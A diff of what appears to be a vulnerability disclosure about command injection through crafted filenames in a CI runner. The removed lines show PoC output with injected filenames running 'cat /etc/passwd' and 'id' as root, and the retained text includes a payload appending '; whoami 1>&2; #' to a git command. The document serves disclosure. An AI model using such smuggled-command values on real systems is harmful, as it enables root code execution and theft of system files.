@@ -74,24 +74,10 @@ The exploitation path is straightforward:
 
 I built a self-contained Docker-based PoC that simulates a CI runner processing a file with a crafted filename. The results speak for themselves:
 
-```
-[Test 1] Payload: cat /etc/passwd (via injected filename)
-------------------------------------------------------------
-  ERROR: From /tmp/poc_test/; pwn ; #.cc
-  ERROR: === INJECTED COMMAND OUTPUT (cat /etc/passwd) ===
-  ERROR: root:x:0:0:root:/root:/bin/bash
-  ERROR: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-  [...]
+<img width="816" height="659" alt="image" src="https://github.com/user-attachments/assets/7e21ac83-2e68-472c-904b-3f7cd6254596" />
 
-  >> RESULT: /etc/passwd content found — INJECTION SUCCESSFUL
+<img width="750" height="244" alt="image" src="https://github.com/user-attachments/assets/3deb5674-970a-4570-97ee-58215cc153c6" />
 
-[Test 2] Payload: id
-------------------------------------------------------------
-  ERROR: From /tmp/poc_test/; id ; #.cc
-  ERROR: uid=0(root) gid=0(root) groups=0(root)
-
-  >> RESULT: 'id' output found — INJECTION SUCCESSFUL
-```
 
 Root-level execution on the CI runner. From a filename.
 
@@ -125,6 +111,11 @@ git log -1 --format="%aI" docs/src/content/app/en.yml; whoami 1>&2; #
 ```
 
 The `git` command runs normally, then `whoami` executes, and `#` comments out the rest. The output confirms code execution.
+
+### Proof of Concept
+
+<img width="873" height="105" alt="image" src="https://github.com/user-attachments/assets/66a4cc13-5528-4b87-97cb-663c173b284b" />
+
 
 ### Why This Matters
 
